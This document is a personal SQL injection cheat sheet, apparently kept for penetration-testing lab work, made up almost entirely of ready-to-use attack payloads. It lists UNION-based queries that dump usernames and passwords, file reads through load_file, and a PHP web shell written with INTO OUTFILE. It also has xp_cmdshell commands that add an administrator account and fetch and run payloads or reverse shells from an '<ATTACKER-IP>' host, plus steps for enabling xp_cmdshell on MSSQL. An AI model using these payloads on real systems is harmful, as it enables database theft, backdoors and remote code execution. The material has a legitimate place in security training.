SQL Injection



********************************// SQL INJECTION********************************************
# https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
# https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
# https://www.doyler.net/security-not-included/oracle-command-execution-sys-shell

*********************************LAB REFERENCE SQL INJECTION**********************************

#1. Column Number Enumeration:

http://10.11.0.22/debug.php?id=1 order by 1 
Increase order by until we receive an error.

#2. Extract further data using Union: 

http://10.11.0.22/debug.php?id=1 union all select 1, 2, 3

#3. Extracting data from Databases:

http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version

http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()

http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables

http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
 
http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users

#4. From SQL Injection to Code Execution

http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/system32/drivers/etc/hosts')

http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET[' cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'

********************************OTHER SQL INJECTION COMMANDS********************************


' OR 1=1--
' OR 1=1--
' OR 1=1#
' OR 1=1)#
',null)#
',null)--
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
'EXEC master..xp_cmdshell 'net user /add kali 1234 && net localgroup administrators /add kali';--
'EXEC master..xp_cmdshell "powershell IEX(New-Object Net.webclient).downloadString('http://<ATTACKER-IP>/shell.ps1')"--
'EXEC master..xp_cmdshell "certutil.exe -urlcache -split -f http://<ATTACKER-IP>/maliciousfile"--
'EXEC master..xp_cmdshell "powershell Start-Process c:\ftproot\shell.exe"--
',convert(int,db_name()))--
',convert(int,@@VERSION))--
' AND 0=1 UNION SELECT 1,2--
' AND 0=1 UNION SELECT null,null--
' AND 0=1 UNION SELECT @@VERSION,2--
' AND 0=1 UNION SELECT @@SERVERNAME,2--
' AND 0=1 UNION SELECT @@VERSION,2--
',convert(int,(user_name())))--
',convert(int,(select table_name from information_schema.tables)))--
',convert(int,(SELECT name FROM master..syslogins)))--
',convert(int,(select top 1 table_name from information_schema.tables)))--
' UNION SELECT null,null,null FROM dual--
' UNION SELECT null,null,1 FROM dual--
' UNION SELECT null,2,3 FROM dual--
' UNION SELECT 1,null,3 FROM dual--
' UNION SELECT 1,2,3 FROM dual--
',convert(int,(select cast(concat(db_name(),0x3a,0x3a,table_name,0x0a) as varchar(8000)) from information_schema.tables for xml path(''))))--
',convert(int,(select cast(concat(db_name(),0x3a,0x3a,column_name,0x0a) as varchar(8000)) from information_schema.columns where table_name='users' for xml path(''))))--
',convert(int,(select cast(concat(username,0x3a,0x3a,email,0x0a) as varchar(8000)) from users for xml path(''))))--
' UNION SELECT user,(select banner from v$version where rownum=1),1 FROM dual--
' UNION SELECT table_name,null,1 FROM all_tables--
' UNION SELECT column_name,null,1 FROM all_tab_columns WHERE table_name='WEB_ADMINS'--
' UNION SELECT column_name,'',1 FROM all_tab_columns WHERE table_name='WEB_USERS'--
' UNION SELECT USER_NAME,PASSWORD,1 FROM WEB_USERS--
' UNION SELECT ADMIN_NAME,PASSWORD,1 FROM WEB_ADMINS--
',convert(int,(select cast(concat(0x3a,0x3a,name,0x0a) as varchar(8000)) from master..sysdatabases for xml path(''))))--
',convert(int,(select cast(concat('archive',0x3a,0x3a,table_name,0x0a) as varchar(8000)) from archive.information_schema.tables for xml path(''))))--
',convert(int,(select cast(concat('pmanager',0x3a,0x3a,column_name,0x0a) as varchar(8000)) from archive.information_schema.columns where table_name='pmanager' for xml path(''))))--
',convert(int,(select alogin,psw FROM archive WHERE table_name='pmanager' FOR XML PATH(''))))--
',convert(int,(select cast(concat(alogin,0x3a,0x3a,psw,0x0a) as varchar(8000)) from archive.dbo.pmanager FOR XML PATH(''))))--

*********************************// SQLi via GET Querystring**********************************
# Enumerate number of columns web app returns; increment final 1 to 2,3,4,etc. to see max col returned
http://192.168.131.10/debug.php?id=1 ORDER BY 1
# Enumerate OS User running DB & DB Version
http://192.168.131.10/debug.php?id=1 UNION SELECT 1,user(),@@version
# Enumerate All Databases' Tables and their respective columns
http://192.168.131.10/debug.php?id=1 UNION SELECT 1,table_name,column_name FROM information_schema.columns
# Enumerate users table column names and their datatypes if web app only returns 2 columns from SQL table and not the first column
http://192.168.131.10/debug.php?id=1 UNION SELECT 1,column_name,data_type FROM information_schema.columns WHERE table_name='users'
# Enumerate All Users & their Passwords from 'users' table
http://192.168.131.10/debug.php?id=1 UNION SELECT 1,username,password FROM users
# Read File from Underlying OS
http://192.168.131.10/debug.php?id=1 UNION SELECT 1,2,load_file('C:/Windows/System32/drivers/etc/hosts')
# Write File to Underlying OS to Establish Shell Access
http://192.168.131.10/debug.php?id=1 UNION SELECT 1,2,"<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE 'C:/xampp/htdocs/backdoor.php'
http://192.168.131.10/backdoor.php?cmd=powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://<ATTACKER-IP>/revshell.bat'))"

************************************SQL INJECTION: STEPS**************************************
# 1. Determine Number of Columns; search= is where the SQL Injection attack surface is.
http://192.168.131.10:9090/search?search=') UNION ORDER BY 1--
http://192.168.131.10:9090/search?search=') UNION ORDER BY 2--
http://192.168.131.10:9090/search?search=') UNION ORDER BY 3--
http://192.168.131.10:9090/search?search=') UNION ORDER BY 4--
http://192.168.131.10:9090/search?search=') UNION ORDER BY 5--
http://192.168.131.10:9090/search?search=') UNION ORDER BY 6--  // ERROR OCCURS!!! Max columns are 5

# 2. Determine Data Types for each field once max columns determined
http://192.168.131.10:9090/search?search=') UNION SELECT 'a',NULL,NULL,NULL,NULL--   # 'a' returned error
http://192.168.131.10:9090/search?search=') UNION SELECT NULL,'a',NULL,NULL,NULL--   # 'a' returned data indicating string
http://192.168.131.10:9090/search?search=') UNION SELECT NULL,'a','a',NULL,NULL--    # 'a' returned data indicating string
http://192.168.131.10:9090/search?search=') UNION SELECT NULL,'a','a','a',NULL--     # 'a' returned error
http://192.168.131.10:9090/search?search=') UNION SELECT NULL,'a','a',NULL,'a'--     # 'a' returned error

# 3. Attempt SQL Injection on table guess using guessed field names
http://192.168.131.10:9090/search?Search=') UNION SELECT NULL,username,password,NULL,NULL FROM users--

// NOSQL
' ||1==1//
, $where: '1 == 1'

// LDAP (:389/tcp|:636/tcp) - PROBING & EXPLOITATION
ldapsearch -h <IP> -p <PORT> -x -s base



******// MSSQL (:1433/tcp) - PROBING & EXPLOITATION******
sqsh -S <IP> -U '<user>' -P '<password>'
EXEC sp_configure 'show advanced options',1
go
RECONFIGURE
go
EXEC sp_configure 'xp_cmdshell',1
go
RECONFIGURE
go
xp_cmdshell '<command>'; go;
EXEC xp_cmdshell ‘powershell -c “wget <ATTACKER-IP>/shell.exe -usebasicparsing -o shell.exe”'
nmap -p <PORT> --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PASSWORD>,ms-sql-xp-cmdshell.cmd="<command>" <IP>

// MYSQL (:3306/tcp) - PROBING & EXPLOITATION
mysql -h <IP> -u <user> -p<PASSWORD> -e 'show databases;'
*********************************************END**********************************************